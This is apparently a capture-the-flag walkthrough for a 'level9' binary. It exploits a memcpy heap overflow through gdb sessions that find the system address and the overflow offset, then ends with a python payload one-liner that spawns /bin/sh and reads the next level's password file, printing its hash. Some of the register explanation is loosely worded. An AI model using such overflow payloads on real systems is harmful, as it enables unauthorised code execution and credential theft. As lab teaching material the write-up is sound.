# Walkthrough

**Main** : 
The vulnerability lies in the fact that the memcpy function can be used to overwrite memory beyond the bounds of this->buffer.
Exploit Plan:

The goal is to overwrite a function pointer in memory with the address of the system function and then trigger that function pointer to execute system("/bin/sh") to spawn a shell.

The main idea behind the exploitation of the `level9` program is to modify the `eax` register of the `setAnnotation` method (the return value) in such a way that when the method returns, it doesn't return to its intended caller but instead goes to the address of the `system` function with `/bin/sh` as an argument.

The `setAnnotation` method uses `memcpy` without proper bounds checking, allowing  to overflow the buffer and potentially overwrite memory beyond it.

**Process**:  
>   There are need to following components for the exploit:
>   Address of the `system` function 
>   Offset to reach the return address of the setAnnotation method (108 bytes).
>   Address of `eax` register when the method returns (0x0804a00c).
>   Payload


![Alt alloc](alloc.png)

## Address of system 


```
(gdb) break main
Breakpoint 1 at 0x80485f8
(gdb) run
Starting program: /home/user/level9/level9 

Breakpoint 1, 0x080485f8 in main ()
(gdb) info address system
Symbol "system" is at 0xb7d86060 in a file compiled without debugging.

$ 
```



## Offset
```
`Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers eax
eax            0x41366441	1094083649
(gdb) 
```

**offset `0x41366441` = 108**  

## Address of `eax` register
```
Breakpoint 4 at 0x804867c
(gdb) run 'AAAA'
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 4, 0x0804867c in main ()
(gdb)  x $eax
0x804a00c:	0x41414141

```

## Payload
```
  $> ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')

  $ cat /home/user/bonus0/.pass
  f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

  ```
